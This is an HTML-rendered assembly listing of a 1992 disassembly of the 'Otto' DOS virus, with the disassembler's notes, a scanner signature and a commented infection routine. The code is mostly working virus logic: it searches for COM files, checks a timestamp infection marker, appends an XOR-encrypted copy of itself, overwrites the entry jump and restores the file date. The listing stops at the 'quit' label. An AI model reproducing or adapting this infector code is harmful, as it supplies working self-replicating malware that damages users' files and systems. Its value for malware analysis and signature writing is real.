<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>OTTO.ASM</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">;******************************************************************************</span><span class="sc0">
</span><span class="sc1">;               Otto Virus</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;              Disassembled by Data Disruptor</span><span class="sc0">
</span><span class="sc1">;        (c) 1992 RABID International Development</span><span class="sc0">
</span><span class="sc1">;               (May.12.92)</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;         Original virus written by YAM (Youth Against McAfee) 1992</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Notes: Otto Schtuck (Pardon the spelling?) claims that this is a super-</span><span class="sc0">
</span><span class="sc1">;    encrypting virus. Well, it took me all of two minutes to get the virus</span><span class="sc0">
</span><span class="sc1">;    into it's disassembled form. Try again guys. It wasn't half bad. For</span><span class="sc0">
</span><span class="sc1">;    this virus, I could not use the techniques outlined in my article in</span><span class="sc0">
</span><span class="sc1">;    Censor Volume 1~, therefore, I had to use another method (which, </span><span class="sc0">
</span><span class="sc1">;    coincidentally is a lot better). Be expecting "Decrypting Viruses</span><span class="sc0">
</span><span class="sc1">;    Part ][" in the next issue of Censor (Slated for release in early</span><span class="sc0">
</span><span class="sc1">;    June).</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;    As always, these disassemblies compile but do not run. They are</span><span class="sc0">
</span><span class="sc1">;    intended to be used for "Hmm. Let's see how that group program's"</span><span class="sc0">
</span><span class="sc1">;    purposes only.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;                           Data Disruptor</span><span class="sc0">
</span><span class="sc1">;                               RABID</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; ~ I don't know the reason why my method outlined in Censor I didn't work.</span><span class="sc0">
</span><span class="sc1">;   It could have had something to do with SMARTDRV and FSP conflicting in</span><span class="sc0">
</span><span class="sc1">;   memory. Nonetheless, another method was found.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; (Ok. So it's not one of my best disassemblies, but at least it shows how</span><span class="sc0">
</span><span class="sc1">;  one can decrypt encrypted viruses...)</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; A scan for this virus is;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   # Otto - Written by Otto Schtuck</span><span class="sc0">
</span><span class="sc1">;   "8A 24 32 E0 88 24 46" Otto Schtuck [Otto] *NEW*</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; It does no damage, does not hide it's file increase, but preserves the time</span><span class="sc0">
</span><span class="sc1">; &amp; date stamp. It does not display any message. It is a transient COM infector</span><span class="sc0">
</span><span class="sc1">; that will infect one file in the current directory each time it is run.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;******************************************************************************</span><span class="sc0">

</span><span class="sc5">file_handle</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">9Eh</span><span class="sc0">         </span><span class="sc1">; File handle location</span><span class="sc0">
</span><span class="sc5">enc_bit</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">            </span><span class="sc1">; Encryption bit</span><span class="sc0">

</span><span class="sc5">code</span><span class="sc0">        </span><span class="sc9">segment</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">public</span><span class="sc0">
        </span><span class="sc9">assume</span><span class="sc0">  </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">code</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">code</span><span class="sc0">
        </span><span class="sc9">org</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc0">

</span><span class="sc1">;---</span><span class="sc0">
</span><span class="sc1">; Length of virus is 379 bytes...</span><span class="sc0">
</span><span class="sc1">;---</span><span class="sc0">

</span><span class="sc5">otto_vir</span><span class="sc0">    </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">far</span><span class="sc0">
</span><span class="sc5">start</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">virus_entry</span><span class="sc0">   </span><span class="sc1">; Virus entry here</span><span class="sc0">
</span><span class="sc1">;---</span><span class="sc0">
</span><span class="sc1">; This hunk of shit here looks encrypted. I couldn't be bothered to go any</span><span class="sc0">
</span><span class="sc1">; further...</span><span class="sc0">
</span><span class="sc1">;---</span><span class="sc0">

</span><span class="sc5">crypt_1</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">90h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">   </span><span class="sc2">12h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">44h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">75h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">64h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">6Eh</span><span class="sc4">,</span><span class="sc2">0C1h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">   </span><span class="sc2">0Eh</span><span class="sc4">,</span><span class="sc2">0EDh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">70h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">05h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">34h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5Dh</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">   </span><span class="sc2">77h</span><span class="sc4">,</span><span class="sc2">0EBh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">35h</span><span class="sc4">,</span><span class="sc2">0D4h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">35h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">46h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">   </span><span class="sc2">34h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">68h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7Ch</span><span class="sc4">,</span><span class="sc2">0A2h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">05h</span><span class="sc4">,</span><span class="sc2">0C1h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">   </span><span class="sc2">24h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">49h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">34h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4Eh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">6Ch</span><span class="sc4">,</span><span class="sc2">0F1h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">   </span><span class="sc2">33h</span><span class="sc4">,</span><span class="sc2">0D5h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5Ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7Bh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">78h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">   </span><span class="sc2">08h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">88h</span><span class="sc0">
</span><span class="sc5">crypt_2</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">69h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0C3h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">79h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">   </span><span class="sc2">08h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">25h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">33h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3Ch</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0B0h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">61h</span><span class="sc4">,</span><span class="sc2">0F2h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">11h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">6Ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5Dh</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">   </span><span class="sc2">4Eh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">25h</span><span class="sc4">,</span><span class="sc2">0CBh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2Fh</span><span class="sc4">,</span><span class="sc2">0D4h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">35h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">   </span><span class="sc2">5Ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7Ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">6Bh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">71h</span><span class="sc4">,</span><span class="sc2">0EBh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2Eh</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0CEh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">31h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">44h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">19h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1Fh</span><span class="sc0">
</span><span class="sc5">virus_entry</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc8">di</span><span class="sc4">-</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">      
        </span><span class="sc6">popf</span><span class="sc0">                </span><span class="sc1">; Pop flags</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">108h</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">enc_bit</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">17Bh</span><span class="sc0">         </span><span class="sc1">; 379 bytes</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">crypt_2</span><span class="sc0">

</span><span class="sc5">decrypt</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">ror</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">            </span><span class="sc1">; Rotate</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">decrypt</span><span class="sc0"> 

        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">enc_ax</span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc5">enc_dh</span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">100h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">crypt_1</span><span class="sc4">,</span><span class="sc8">dh</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">filespec</span><span class="sc0">     </span><span class="sc1">; Set filespec</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">           </span><span class="sc1">; Search for normal files</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4Eh</span><span class="sc0">          </span><span class="sc1">; Search for first match</span><span class="sc0">
</span><span class="sc5">search_handler</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">         
        </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">got_file</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">quit</span><span class="sc0">
</span><span class="sc1">;---</span><span class="sc0">
</span><span class="sc1">; Otto! If you want to save some bytes, you don't have to open the file in </span><span class="sc0">
</span><span class="sc1">; order to get it's time. There are other ways around this...</span><span class="sc0">
</span><span class="sc1">;---</span><span class="sc0">

</span><span class="sc5">got_file</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">file_handle</span><span class="sc0">      </span><span class="sc1">; Get file handle from DTA</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3D02h</span><span class="sc0">        </span><span class="sc1">; Open file with read/write</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">         
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">           </span><span class="sc1">; Save file handle in BX</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5700h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">         </span><span class="sc1">; Get time/date from file</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">            </span><span class="sc1">; Check timestamp</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">found_host</span><span class="sc0">      </span><span class="sc1">; Not equal to our timestamp?</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Eh</span><span class="sc0">          </span><span class="sc1">; Then close the file and...</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">         </span><span class="sc1">; </span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4Fh</span><span class="sc0">          </span><span class="sc1">; ...Search for next match</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">search_handler</span><span class="sc0">
</span><span class="sc5">found_host</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">move_ptr_start</span><span class="sc0">      </span><span class="sc1">; Move file pointer to start</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc5">three_bytes</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Set buffer space for 3 bytes</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">            </span><span class="sc1">; Set for 3 bytes</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Fh</span><span class="sc0">          </span><span class="sc1">; Read in file</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">     
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">           </span><span class="sc1">; Set registers to...</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">           </span><span class="sc1">; ...absolute end of file</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4202h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">         </span><span class="sc1">; Move file point to end</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">ptr_loc</span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">adj_ptr_loc</span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">move_ptr_start</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">work</span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">ptr_loc</span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc1">;---</span><span class="sc0">
</span><span class="sc1">; Set buffer space at end of the file so that we don't waste space in the</span><span class="sc0">
</span><span class="sc1">; virus</span><span class="sc0">
</span><span class="sc1">;---</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">2A4h</span><span class="sc4">]</span><span class="sc0">    
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Fh</span><span class="sc0">          </span><span class="sc1">; Read in file</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">     
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc5">work</span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">copyright</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">encrypt</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">move_ptr_start</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">ptr_loc</span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">2A4h</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; Load effective addr</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">          </span><span class="sc1">; </span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">         
        </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">check_write</span><span class="sc0">     </span><span class="sc1">; </span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">quit</span><span class="sc0">
</span><span class="sc5">check_write</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">105h</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; Load effective addr</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">24h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">          </span><span class="sc1">; </span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">     
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">17Bh</span><span class="sc0">         </span><span class="sc1">; 379 bytes</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">copyright</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">crypt_2</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">           </span><span class="sc1">; </span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc5">work</span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">17Bh</span><span class="sc0">         </span><span class="sc1">; 397 bytes</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">copyright</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">encrypt</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">17Bh</span><span class="sc0">         </span><span class="sc1">; 397 bytes</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">2A4h</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; Set buffer to encrypted data</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">          </span><span class="sc1">; Write out the virus to the </span><span class="sc0">
                        </span><span class="sc1">; file</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">         
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">quit</span><span class="sc0">            </span><span class="sc1">; Jump if carry Set</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">move_ptr_start</span><span class="sc0">      </span><span class="sc1">; Move file pointer to start</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc5">new_jump</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; Load DX with the new jump</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">          </span><span class="sc1">; </span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">            </span><span class="sc1">; Set for 3 bytes</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">         </span><span class="sc1">; Write out the new jump</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">quit</span><span class="sc0">            </span><span class="sc1">; Jump if carry Set</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">            </span><span class="sc1">; Set low order time with </span><span class="sc0">
                        </span><span class="sc1">; our identity byte</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5701h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">         </span><span class="sc1">; Set file date/time</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Eh</span><span class="sc0">          </span><span class="sc1">; </span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">         </span><span class="sc1">; Close the file</span><span class="sc0">

</span><span class="sc1">;---</span><span class="sc0">
</span><span class="sc1">; Hmm. This routine looks a bit familiar... Maybe it was "borrowed" from the</span><span class="sc0">
</span><span class="sc1">; RAGE Virus we wrote...</span><span class="sc0">
</span><span class="sc1">;---</span><span class="sc0">

</span><span class="sc5">quit</span><span class="sc4">:</span><span class="sc0">
